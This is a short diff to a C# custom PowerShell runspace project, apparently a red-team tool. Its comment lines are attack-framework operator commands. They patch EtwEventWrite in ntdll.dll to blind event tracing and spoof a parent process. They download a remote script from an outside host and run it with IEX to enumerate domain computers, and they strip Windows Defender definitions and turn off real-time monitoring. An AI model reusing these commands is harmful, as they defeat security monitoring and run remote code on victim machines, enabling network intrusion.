@@ -49,9 +49,8 @@ namespace customrunspace
         }
     }
 }
-
-// spawnto x64 spawnto x64 %windir%\System32\RuntimeBroker.exe then ppid to it
-// execute-assembly "PATCHES: ntdll.dll,EtwEventWrite,0,C3 ntdll.dll,EtwEventWrite,1,00" c:\tools\psh.exe --assemblyargs hostname;ps; m 
-// execute-assembly "PATCHES: ntdll.dll,EtwEventWrite,0,C3 ntdll.dll,EtwEventWrite,1,00" c:\tools\psh.exe --assemblyargs "(New-Object System.Net.WebClient).DownloadString('http://infinity-bank.com/pv.txt') | IEX; Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName;" m 
 // C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35
-// execute-assembly "PATCHES: ntdll.dll,EtwEventWrite,0,C3 ntdll.dll,EtwEventWrite,1,00" c:\tools\psh.exe --assemblyargs "cd 'C:\Program Files\Windows Defender'; .\MpCmdRun.exe -RemoveDefinitions -All; Set-MpPreference -DisableRealtimeMonitoring $true;" m
+// spawnto x64 spawnto x64 %windir%\System32\RuntimeBroker.exe then ppid to it
+// execute-assembly "PATCHES: ntdll.dll,EtwEventWrite,0,C3 ntdll.dll,EtwEventWrite,1,00" c:\tools\psh.exe hostname;ps; m 
+// execute-assembly "PATCHES: ntdll.dll,EtwEventWrite,0,C3 ntdll.dll,EtwEventWrite,1,00" c:\tools\psh.exe "(New-Object System.Net.WebClient).DownloadString('http://infinity-bank.com/pv.txt') | IEX; Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName;" m 
+// execute-assembly "PATCHES: ntdll.dll,EtwEventWrite,0,C3 ntdll.dll,EtwEventWrite,1,00" c:\tools\psh.exe "cd 'C:\Program Files\Windows Defender'; .\MpCmdRun.exe -RemoveDefinitions -All; Set-MpPreference -DisableRealtimeMonitoring $true;" m
